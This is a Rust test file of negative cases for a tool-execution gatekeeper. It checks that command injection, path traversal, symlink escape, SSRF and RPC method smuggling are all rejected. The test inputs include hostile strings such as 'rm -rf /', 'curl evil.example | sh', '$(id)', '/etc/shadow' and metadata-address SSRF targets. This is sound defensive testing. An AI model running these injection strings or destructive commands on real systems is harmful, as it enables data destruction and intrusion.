//! Negative test corpus (NFR-8) -- the parts of `tests/test_negative_corpus.py`
//! that exercise Tier 1, the catalog and validation. Every test describes
//! an attack that must fail. (The identity, audit and service classes are
//! ported with those modules.)

mod common;

use std::net::IpAddr;

use common::*;
use gatekeeper::catalog::{parse_tool_spec, Catalog, ToolDef};
use gatekeeper::errors::{DenialReason, Denied};
use gatekeeper::tier1::Tier1;
use gatekeeper::validate::{
    build_argv, build_http_request, build_rpc_call, check_protected, resolve_parameters, resolve_scopes, Values,
};
use serde_json::{json, Value};

struct Env {
    _tmp: tempfile::TempDir,
    tmp: std::path::PathBuf,
    sandbox: std::path::PathBuf,
    tier1: Tier1,
    catalog: Catalog,
}

fn env() -> Env {
    let dir = tempfile::tempdir().unwrap();
    let tmp = dir.path().to_path_buf();
    let sandbox = sandbox(&tmp);
    let tier1 = demo_tier1(&tmp, &sandbox);
    let catalog = catalog_ok(&tmp, &tier1, &tool_specs(&sandbox));
    Env { _tmp: dir, tmp, sandbox, tier1, catalog }
}

fn tool<'a>(c: &'a Catalog, id: &str) -> &'a ToolDef {
    c.get(id).unwrap()
}

fn resolve(t: &ToolDef, a: Value) -> Result<Values, Denied> {
    resolve_parameters(t, &args(a))
}

fn vals(pairs: &[(&str, &str)]) -> Values {
    pairs.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect()
}

fn one_param_tool(id: &str, argv: Value, params: Value) -> Value {
    json!({
        "id": id, "toolkit": "demo", "binary": PYTHON, "title": "x", "description": "x",
        "category": "read", "idempotent": true, "enabled": true, "argv": argv,
        "parameters": params, "required_scopes": [], "timeout_seconds": 5, "max_output_bytes": 1024,
    })
}

// -- Class 1: metacharacters, line breaks, null bytes -------------------------

#[test]
fn metacharacters_rejected() {
    let e = env();
    let t = tool(&e.catalog, "demo.show");
    for value in [
        "media; rm -rf /",
        "media && curl evil.example",
        "media | sh",
        "media`whoami`",
        "media$(id)",
        "media\nrm -rf /",
        "media\x00",
        "media\ttab",
        "media\r\ninjected",
        "media > /etc/passwd",
        "media\x1b[31m",
    ] {
        let err = resolve(t, json!({"stack": value})).unwrap_err();
        assert!(
            matches!(err.reason, DenialReason::ParamInvalid | DenialReason::ControlCharacter),
            "{value:?}: {err}"
        );
    }
}

#[test]
fn control_characters_rejected_even_with_permissive_pattern() {
    let e = env();
    let err = resolve(tool(&e.catalog, "demo.echo"), json!({"text": "harmless\x00after"})).unwrap_err();
    assert_eq!(err.reason, DenialReason::ControlCharacter);
    assert_eq!(err.detail, "Parameter 'text' contains a control character (U+0000).");
}

#[test]
fn allow_control_characters_opt_out_admits_newlines_tabs_and_nul() {
    let e = env();
    let spec = one_param_tool(
        "demo.write_like",
        json!(["{content}"]),
        json!({"content": {"type": "string", "required": true, "pattern": "[\\s\\S]*",
                            "allow_control_characters": true, "description": "x"}}),
    );
    let c = catalog_ok(&e.tmp, &e.tier1, &[spec]);
    let t = tool(&c, "demo.write_like");
    let text = "line one\nline two\twith a tab\n";
    assert_eq!(resolve(t, json!({"content": text})).unwrap()["content"], text);
    // Documented, not stricter: NUL is admitted too.
    assert_eq!(resolve(t, json!({"content": "a\x00b"})).unwrap()["content"], "a\x00b");
}

// -- Class 2: a parameter cannot produce a second argument (FR-5.4) -----------

#[test]
fn parameter_cannot_produce_second_argv_element() {
    let e = env();
    let t = tool(&e.catalog, "demo.echo");
    let hostile = "harmless; rm -rf / && curl evil.example | sh";
    let values = resolve(t, json!({"text": hostile})).unwrap();
    let argv = build_argv(t, &values, e.tier1.toolkit("demo").unwrap()).unwrap();
    assert_eq!(argv, vec![PYTHON, "-c", "import sys; print(sys.argv[1])", hostile]);
}

#[test]
fn denied_arg_caught_after_substitution() {
    let e = env();
    let spec = one_param_tool(
        "demo.passthru",
        json!(["{word}"]),
        json!({"word": {"type": "string", "required": true, "pattern": "^[a-z-]+$", "description": "x"}}),
    );
    let c = catalog_ok(&e.tmp, &e.tier1, &[spec]);
    let t = tool(&c, "demo.passthru");
    let values = resolve(t, json!({"word": "rm"})).unwrap();
    let err = build_argv(t, &values, e.tier1.toolkit("demo").unwrap()).unwrap_err();
    assert_eq!(err.reason, DenialReason::Tier1Violation);
    assert_eq!(err.detail, "Argument 'rm' is denied for this toolkit.");
}

// -- Class 3: path traversal and symlink escape -------------------------------

#[test]
fn traversal_blocked_by_pattern() {
    let e = env();
    let t = tool(&e.catalog, "demo.show");
    for attempt in ["../etc", "..", "a/../../b", "/etc/passwd"] {
        assert!(resolve(t, json!({"stack": attempt})).is_err(), "{attempt}");
    }
}

#[test]
fn derived_path_resolves_under_root() {
    let e = env();
    let t = tool(&e.catalog, "demo.show");
    let v = resolve(t, json!({"stack": "media-jellyfin"})).unwrap();
    let expected = gatekeeper::pathutil::realpath(e.sandbox.join("media-jellyfin/compose.yaml").to_str().unwrap()).unwrap();
    assert_eq!(v["compose_path"], expected);
    assert_eq!(v.keys().collect::<Vec<_>>(), vec!["stack", "compose_path"]);
}

#[test]
fn symlink_escape_blocked() {
    let e = env();
    let outside = e.tmp.join("outside");
    std::fs::create_dir(&outside).unwrap();
    std::fs::write(outside.join("compose.yaml"), "services: {}\n").unwrap();
    std::os::unix::fs::symlink(&outside, e.sandbox.join("escape")).unwrap();
    let err = resolve(tool(&e.catalog, "demo.show"), json!({"stack": "escape"})).unwrap_err();
    assert_eq!(err.reason, DenialReason::PathEscape);
}

#[test]
fn sibling_directory_prefix_not_confused_for_child() {
    let e = env();
    let sibling = e.tmp.join("raid-evil");
    std::fs::create_dir(&sibling).unwrap();
    std::fs::write(sibling.join("compose.yaml"), "x").unwrap();
    let spec = one_param_tool(
        "demo.sibling",
        json!(["{path}"]),
        json!({"path": {"type": "path", "derived": sibling.join("compose.yaml").to_str().unwrap(),
                         "must_resolve_under": e.sandbox.to_str().unwrap(), "description": "x"}}),
    );
    let c = catalog_ok(&e.tmp, &e.tier1, &[spec]);
    let err = resolve(tool(&c, "demo.sibling"), json!({})).unwrap_err();
    assert_eq!(err.reason, DenialReason::PathEscape);
    assert!(err.detail.contains("path resolves outside"), "{}", err.detail);
}

// -- Class 4: Tier 1 violations are caught at load time -----------------------

fn load_one(e: &Env, spec: Value) -> String {
    err_text(make_catalog(&e.tmp, &e.tier1, &[spec], true))
}

#[test]
fn binary_outside_allowlist_rejected() {
    let e = env();
    let mut spec = one_param_tool("demo.evil", json!(["-c", "id"]), json!({}));
    spec["binary"] = json!("/bin/bash");
    let msg = load_one(&e, spec.clone());
    assert_eq!(msg, "Toolkit 'demo': binary '/bin/bash' is not in the allowlist ['/bin/sh']");
    // Non-strict: disabled and kept for repair, not lost.
    let c = make_catalog(&e.tmp, &e.tier1, &[spec], false).unwrap();
    assert!(c.tools.is_empty());
    assert_eq!(c.disabled_by_tier1, vec![msg.clone()]);
    assert_eq!(c.rejected[0].1, msg);
}

#[test]
fn unknown_toolkit_rejected() {
    let e = env();
    let mut spec = one_param_tool("ghost.tool", json!([]), json!({}));
    spec["toolkit"] = json!("ghost");
    let err = make_catalog(&e.tmp, &e.tier1, &[spec], true).unwrap_err();
    assert!(err.is_tier1_violation());
    assert_eq!(err.message, "tool 'ghost.tool': Unknown toolkit 'ghost'");
}

#[test]
fn timeout_above_toolkit_ceiling_rejected() {
    let e = env();
    let mut spec = one_param_tool("demo.slow", json!([]), json!({}));
    spec["timeout_seconds"] = json!(9999);
    assert_eq!(load_one(&e, spec), "tool 'demo.slow': timeout_seconds=9999 exceeds the toolkit maximum 30");
}

#[test]
fn string_parameter_without_pattern_rejected() {
    let e = env();
    let spec = one_param_tool(
        "demo.free",
        json!(["{anything}"]),
        json!({"anything": {"type": "string", "description": "free"}}),
    );
    assert!(load_one(&e, spec).contains("FR-5.7"));
}

#[test]
fn path_root_outside_toolkit_rejected() {
    let e = env();
    let spec = one_param_tool(
        "demo.wide",
        json!(["{p}"]),
        json!({
            "p": {"type": "path", "derived": "/etc/{x}", "must_resolve_under": "/etc", "description": "x"},
            "x": {"type": "string", "pattern": "^[a-z]+$", "description": "x"},
        }),
    );
    let msg = load_one(&e, spec);
    assert!(msg.starts_with("tool 'demo.wide': Toolkit 'demo': '/etc' lies outside the path_roots"), "{msg}");
}

// -- Class 5: derived parameters cannot be overridden -------------------------

#[test]
fn derived_parameter_cannot_be_supplied() {
    let e = env();
    let err = resolve(
        tool(&e.catalog, "demo.show"),
        json!({"stack": "media-jellyfin", "compose_path": "/etc/shadow"}),
    )
    .unwrap_err();
    assert_eq!(err.reason, DenialReason::ParamDerivedSupplied);
}

#[test]
fn unknown_parameter_rejected() {
    let e = env();
    let err = resolve(tool(&e.catalog, "demo.show"), json!({"stack": "media-jellyfin", "extra": "x"})).unwrap_err();
    assert_eq!(err.reason, DenialReason::ParamUnknown);
    assert_eq!(err.detail, "Unknown parameter 'extra'.");
}

// -- Class 6: protected resources (FR-4.12) -----------------------------------

#[test]
fn protected_resource_blocked() {
    let e = env();
    let t = tool(&e.catalog, "demo.show");
    let values = resolve(t, json!({"stack": "gatekeeper"})).unwrap();
    let scopes = resolve_scopes(t, &values).unwrap();
    assert_eq!(scopes, vec!["stack:gatekeeper"]);
    let err = check_protected(&scopes, e.tier1.toolkit("demo").unwrap()).unwrap_err();
    assert_eq!(err.reason, DenialReason::ProtectedResource);
    assert_eq!(err.agent_message(), gatekeeper::errors::OPAQUE_DENIAL);
}

// -- Class 10: HTTP target allowlist and path traversal -----------------------

fn http_tier1(tmp: &std::path::Path, cidrs: &[&str], prefixes: &[&str]) -> Tier1 {
    let p: String = prefixes.iter().map(|x| format!("      - \"{x}\"\n")).collect();
    let c: String = cidrs.iter().map(|x| format!("      - \"{x}\"\n")).collect();
    tier1_text(
        tmp,
        &format!(
            "toolkits:\n  demo_http:\n    executor: http\n    base_url: \"http://127.0.0.1:1\"\n    \
             allowed_methods: [\"GET\", \"POST\"]\n    allowed_path_prefixes:\n{p}    allowed_cidrs:\n{c}"
        ),
    )
    .unwrap()
}

fn http_tool(tier1: &Tier1, overrides: Value) -> gatekeeper::errors::ConfigResult<ToolDef> {
    let mut spec = json!({
        "id": "demo_http.get_thing", "toolkit": "demo_http", "version": 1,
        "title": "Get thing", "description": "test", "category": "read",
        "enabled": true, "method": "GET", "path": "/api/thing/{name}",
        "parameters": {"name": {"type": "string", "pattern": "^.*$", "required": true}},
        "timeout_seconds": 5, "max_output_bytes": 65536,
    });
    for (k, v) in overrides.as_object().unwrap() {
        spec[k] = v.clone();
    }
    parse_tool_spec(&spec, tier1)
}

#[test]
fn http_path_traversal_rejected() {
    let dir = tempfile::tempdir().unwrap();
    let tier1 = http_tier1(dir.path(), &["127.0.0.1/32"], &["/api/"]);
    let tk = tier1.toolkit("demo_http").unwrap();
    let t = http_tool(&tier1, json!({})).unwrap();
    for name in ["../../../etc/passwd", "..", "%2e%2e", "%2E%2E", "%2e%2e%2f", "..%2f..%2fetc"] {
        let err = build_http_request(&t, &vals(&[("name", name)]), tk).unwrap_err();
        assert_eq!(err.reason, DenialReason::PathEscape, "{name}");
    }
    let err = build_http_request(&t, &vals(&[("name", "%2e%2e")]), tk).unwrap_err();
    assert_eq!(err.detail, "path: resolved path '/api/thing/%2e%2e' percent-decodes to a '..' segment.");
    let ok = build_http_request(&t, &vals(&[("name", "widget")]), tk).unwrap();
    assert_eq!((ok.method.as_str(), ok.path.as_str()), ("GET", "/api/thing/widget"));
    assert!(ok.body.is_none());
}

#[test]
fn allows_path_prefix_boundary() {
    let dir = tempfile::tempdir().unwrap();
    let tier1 = http_tier1(dir.path(), &["127.0.0.1/32"], &["/api/v3/series"]);
    let tk = tier1.toolkit("demo_http").unwrap();
    assert!(tk.allows_path("/api/v3/series"));
    assert!(tk.allows_path("/api/v3/series/123"));
    assert!(!tk.allows_path("/api/v3/seriesXYZ"));
    assert!(!tk.allows_path("/api/v3/serie"));
    let tier1 = http_tier1(dir.path(), &["127.0.0.1/32"], &["/api/"]);
    let tk = tier1.toolkit("demo_http").unwrap();
    assert!(tk.allows_path("/api/thing/widgets"));
    assert!(!tk.allows_path("/apix/thing"));
}

#[test]
fn ssrf_blocked_outside_allowed_cidrs() {
    let dir = tempfile::tempdir().unwrap();
    let tier1 = http_tier1(dir.path(), &["203.0.113.1/32"], &["/api/"]);
    let tk = tier1.toolkit("demo_http").unwrap();
    for ip in ["192.168.1.1", "10.0.0.1", "172.16.0.1", "169.254.169.254"] {
        assert!(!tk.in_allowed_cidrs(ip.parse::<IpAddr>().unwrap()), "{ip}");
    }
    let tier1 = http_tier1(dir.path(), &["192.168.1.42/32"], &["/api/"]);
    let tk = tier1.toolkit("demo_http").unwrap();
    assert!(tk.in_allowed_cidrs("192.168.1.42".parse().unwrap()));
    assert!(!tk.in_allowed_cidrs("192.168.1.43".parse().unwrap()));
}

#[test]
fn disallowed_http_method_and_prefix_rejected_at_load() {
    let dir = tempfile::tempdir().unwrap();
    let tier1 = http_tier1(dir.path(), &["127.0.0.1/32"], &["/api/"]);
    let err = http_tool(&tier1, json!({"id": "demo_http.delete_thing", "method": "DELETE"})).unwrap_err();
    assert!(err.is_tier1_violation());
    assert_eq!(
        err.message,
        "tool 'demo_http.delete_thing': method 'DELETE' is not in the allowlist ['GET', 'POST'] of toolkit 'demo_http'"
    );
    let err = http_tool(&tier1, json!({"id": "demo_http.other", "path": "/other/{name}"})).unwrap_err();
    assert!(err.is_tier1_violation());
    assert_eq!(
        err.message,
        "tool 'demo_http.other': path '/other/{name}' matches none of the allowed_path_prefixes ['/api/'] of toolkit 'demo_http'"
    );
}

#[test]
fn follow_redirects_true_rejected_at_load() {
    let dir = tempfile::tempdir().unwrap();
    let err = tier1_text(
        dir.path(),
        "toolkits:\n  demo_http:\n    executor: http\n    base_url: \"http://127.0.0.1:1\"\n    \
         allowed_methods: [\"GET\"]\n    allowed_path_prefixes: [\"/api/\"]\n    \
         allowed_cidrs: [\"127.0.0.1/32\"]\n    follow_redirects: true\n",
    )
    .unwrap_err();
    assert!(err.message.contains("FR-8.8"));
}

// -- Class 11: RPC method whitelist ---------------------------------------------

fn truenas_tier1(tmp: &std::path::Path, methods: &[&str]) -> Tier1 {
    let m: String = methods.iter().map(|x| format!("      - {x}\n")).collect();
    tier1_text(
        tmp,
        &format!(
            "toolkits:\n  demo_truenas:\n    executor: truenas\n    ws_url: \"wss://127.0.0.1:1/api/current\"\n    allowed_rpc_methods:\n{m}"
        ),
    )
    .unwrap()
}

#[test]
fn rpc_method_not_on_whitelist_rejected_at_load() {
    let dir = tempfile::tempdir().unwrap();
    let tier1 = truenas_tier1(dir.path(), &["pool.query"]);
    let spec = json!({
        "id": "demo_truenas.delete_dataset", "toolkit": "demo_truenas", "version": 1,
        "title": "x", "description": "x", "category": "write", "enabled": true,
        "method": "pool.dataset.delete", "params": {}, "parameters": {}, "required_scopes": [],
        "timeout_seconds": 10, "max_output_bytes": 4096,
    });
    assert!(parse_tool_spec(&spec, &tier1).unwrap_err().is_tier1_violation());
}

#[test]
fn rpc_param_value_cannot_change_the_method() {
    let dir = tempfile::tempdir().unwrap();
    let tier1 = truenas_tier1(dir.path(), &["pool.dataset.create"]);
    let spec = json!({
        "id": "demo_truenas.create_dataset", "toolkit": "demo_truenas", "version": 1,
        "title": "x", "description": "x", "category": "write", "enabled": true,
        "method": "pool.dataset.create", "params": {"name": "{name}"},
        "parameters": {"name": {"type": "string", "pattern": "^.*$", "required": true}},
        "required_scopes": [], "timeout_seconds": 10, "max_output_bytes": 4096,
    });
    let t = parse_tool_spec(&spec, &tier1).unwrap();
    let tk = tier1.toolkit("demo_truenas").unwrap();
    for malicious in ["tank; pool.dataset.delete", "tank\npool.dataset.delete", "tank\x00"] {
        let Ok(resolved) = resolve(&t, json!({"name": malicious})) else { continue };
        let (method, params) = build_rpc_call(&t, &resolved, tk).unwrap();
        assert_eq!(method, "pool.dataset.create");
        assert_eq!(params["name"], malicious);
    }
}

// -- Class 11b: secret parameters (1.23.0) ---------------------------------------

fn secret_spec(params: Value, scopes: Value, passphrase: Value) -> Value {
    json!({
        "id": "demo_truenas.unlock", "toolkit": "demo_truenas", "version": 1,
        "title": "x", "description": "x", "category": "write", "enabled": true,
        "method": "pool.dataset.create", "params": params,
        "parameters": {
            "name": {"type": "string", "pattern": "^[a-z/]+$", "required": true},
            "passphrase": passphrase,
        },
        "required_scopes": scopes, "timeout_seconds": 10, "max_output_bytes": 4096,
    })
}

fn passphrase() -> Value {
    json!({"type": "string", "pattern": "^[0-9a-f]{64}$", "required": true, "secret": true})
}

#[test]
fn a_secret_may_only_be_sent_in_params() {
    let dir = tempfile::tempdir().unwrap();
    let tier1 = truenas_tier1(dir.path(), &["pool.dataset.create"]);
    let ok = secret_spec(json!({"data": {"name": "{name}", "key": "{passphrase}"}}), json!(["ds:{name}"]), passphrase());
    assert!(parse_tool_spec(&ok, &tier1).is_ok());

    // In a scope it would be logged with every call.
    let in_scope = secret_spec(json!({"data": {"key": "{passphrase}"}}), json!(["ds:{passphrase}"]), passphrase());
    assert!(err_text(parse_tool_spec(&in_scope, &tier1)).contains("may only be used in 'params'"));

    // Not a string, or derived: refused.
    for bad in [
        json!({"type": "integer", "required": true, "secret": true}),
        json!({"type": "string", "derived": "{name}", "secret": true}),
    ] {
        let spec = secret_spec(json!({"data": {"key": "{passphrase}"}}), json!([]), bad);
        assert!(err_text(parse_tool_spec(&spec, &tier1)).contains("is secret"));
    }
}

#[test]
fn a_secret_on_an_argv_executor_is_refused() {
    let dir = tempfile::tempdir().unwrap();
    let sb = sandbox(dir.path());
    let tier1 = demo_tier1(dir.path(), &sb);
    let spec = json!({
        "id": "demo.unlock", "toolkit": "demo", "binary": "/bin/sh", "version": 1,
        "title": "x", "description": "x", "category": "write", "enabled": true,
        "argv": ["-c", "true", "sh", "{passphrase}"],
        "parameters": {"passphrase": passphrase()},
        "required_scopes": [], "timeout_seconds": 10, "max_output_bytes": 4096,
    });
    assert!(err_text(parse_tool_spec(&spec, &tier1)).contains("only supported on truenas tools"));
}

#[test]
fn nested_rpc_params_substitute_leaves_and_type_whole_placeholders() {
    let dir = tempfile::tempdir().unwrap();
    let tier1 = truenas_tier1(dir.path(), &["pool.dataset.create"]);
    let spec = json!({
        "id": "demo_truenas.create_dataset", "toolkit": "demo_truenas", "version": 1,
        "title": "x", "description": "x", "category": "write", "enabled": true,
        "method": "pool.dataset.create",
        "params": {"data": {"name": "tank/{name}", "quota": "{quota}", "sparse": "{sparse}",
                            "label": "q={quota}", "fixed": 3, "filters": [["name", "=", "{name}"]]}},
        "parameters": {
            "name": {"type": "string", "pattern": "^[a-z]+$", "required": true},
            "quota": {"type": "integer", "required": true},
            "sparse": {"type": "boolean", "required": true},
        },
        "required_scopes": [], "timeout_seconds": 10, "max_output_bytes": 4096,
    });
    let t = parse_tool_spec(&spec, &tier1).unwrap();
    let tk = tier1.toolkit("demo_truenas").unwrap();
    let resolved = resolve(&t, json!({"name": "alpha", "quota": 42, "sparse": true})).unwrap();
    let (_, params) = build_rpc_call(&t, &resolved, tk).unwrap();
    assert_eq!(
        params["data"],
        json!({"name": "tank/alpha", "quota": 42, "sparse": true, "label": "q=42", "fixed": 3,
               "filters": [["name", "=", "alpha"]]})
    );

    // A placeholder inside a nested value still has to be declared.
    let mut unknown = spec.clone();
    unknown["params"]["data"]["filters"] = json!([["name", "=", "{nope}"]]);
    assert!(err_text(parse_tool_spec(&unknown, &tier1)).contains("unknown parameter 'nope'"));
}

#[test]
fn a_job_tool_needs_core_get_jobs_in_the_allowlist() {
    let dir = tempfile::tempdir().unwrap();
    let spec = json!({
        "id": "demo_truenas.unlock", "toolkit": "demo_truenas", "version": 1,
        "title": "x", "description": "x", "category": "write", "enabled": true,
        "method": "pool.dataset.unlock", "job": true, "params": {"id": "{name}"},
        "parameters": {"name": {"type": "string", "pattern": "^[a-z/]+$", "required": true}},
        "required_scopes": [], "timeout_seconds": 10, "max_output_bytes": 4096,
    });
    let without = truenas_tier1(dir.path(), &["pool.dataset.unlock"]);
    assert!(parse_tool_spec(&spec, &without).unwrap_err().is_tier1_violation());
    let with = truenas_tier1(dir.path(), &["pool.dataset.unlock", "core.get_jobs"]);
    assert!(parse_tool_spec(&spec, &with).unwrap().rpc_job);
}
